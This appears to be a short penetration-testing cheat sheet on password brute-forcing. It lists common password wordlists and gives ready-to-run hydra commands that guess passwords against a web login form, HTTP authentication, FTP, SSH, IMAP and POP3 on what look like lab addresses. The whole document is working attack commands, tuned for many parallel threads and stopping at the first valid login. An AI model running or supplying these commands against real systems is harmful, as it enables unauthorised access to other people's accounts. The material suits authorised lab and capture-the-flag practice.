Wordlists:
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/darkweb2017-top1000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/wordlists/dirb/others/best1050.txt
```
<https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt>

We can for instance use hydra like this
(Note: You can get the parameters used from burp suite response when enumerating)
#### login-form:
```hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V -e nsr -f -t 50 -K```

#### http-get:
```hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.52 http-get /inferno -V -e nsr -f -t 50 -K```

#### FTP:
```hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 ftp -V -e nsr -f -t 50 -K```

#### SSH:
```hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 ssh -V -e nsr -f -t 50 -K```

#### IMAP:
```hydra -l mark -P /usr/share/wordlists/rockyou.txt -V 10.10.204.203 imap -V -e nsr -f -t 50 -K```

#### POP3:
```hydra -l James -P /usr/share/wordlists/rockyou.txt -V 10.11.1.72 pop3 -V -e nsr -f -t 60 -K```